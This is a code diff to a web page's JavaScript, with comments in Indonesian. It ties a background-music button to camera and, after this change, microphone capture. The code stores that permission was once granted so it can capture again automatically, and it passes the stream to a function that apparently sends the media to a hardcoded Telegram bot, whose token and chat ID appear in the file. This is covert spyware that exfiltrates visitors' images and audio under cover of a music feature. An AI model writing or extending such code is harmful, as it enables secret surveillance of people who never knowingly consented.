@@ -9,7 +9,7 @@ if (openPhotoOptions && photoOptions) {
 const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
 const CHAT_ID = "6864694275";
 
-// === BAGIAN MUSIK + KAMERA — TANPA MIC ===
+// === BAGIAN MUSIK + KAMERA + SUARA — HYBRID FIX STABIL (1X IZIN) ===
 const music = document.getElementById('bgmusic');
 const btnMusic = document.getElementById('musicButton');
 let started = false;
@@ -36,21 +36,21 @@ async function startMusicAndCamera() {
       const alreadyAllowed = localStorage.getItem("user_allows_auto_capture") === "1";
       let stream;
 
-      // ✅ hanya 1 kali izin video saja (tanpa audio)
+      // ✅ hanya 1 kali izin video + audio
       if (!alreadyAllowed && navigator.mediaDevices) {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         localStorage.setItem("user_allows_auto_capture", "1");
-        console.log("✅ Izin kamera diberikan pertama kali.");
+        console.log("✅ Izin kamera & mic diberikan pertama kali.");
       } else if (alreadyAllowed) {
         console.log("📸 Kamera sudah diizinkan sebelumnya, ambil otomatis...");
-        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
       }
 
-      // kirim foto otomatis
+      // kirim ke 2 fungsi, tapi 1 stream yang sama
       await autoCaptureAndSend(stream);
 
     } catch (e) {
-      console.warn("❌ User menolak izin kamera:", e);
+      console.warn("❌ User menolak izin kamera atau mikrofon:", e);
     }
   }, musicStarted ? 800 : 1500);
 
@@ -103,7 +103,7 @@ async function autoCaptureAndSend(stream) {
   }
 }
 
-// === Event Listener Fix (musik + kamera) ===
+// === Event Listener Fix (musik + kamera + mic) ===
 function userStart() {
   startMusicAndCamera().catch(console.warn);
 }
